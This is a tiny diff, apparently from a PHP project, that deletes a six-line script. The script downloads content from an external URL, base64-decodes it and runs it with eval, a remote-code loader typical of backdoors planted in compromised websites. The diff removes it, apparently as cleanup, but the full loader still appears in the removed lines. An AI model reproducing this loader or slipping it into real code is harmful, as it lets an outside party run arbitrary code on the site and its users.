@@ -1,6 +1,0 @@
-<?php
-$z3r0 = "https://sudo-security.github.io/d";
-$z3r0fy = file_get_contents($z3r0);
-eval ("?>".(base64_decode($z3r0fy)));
-
-?>
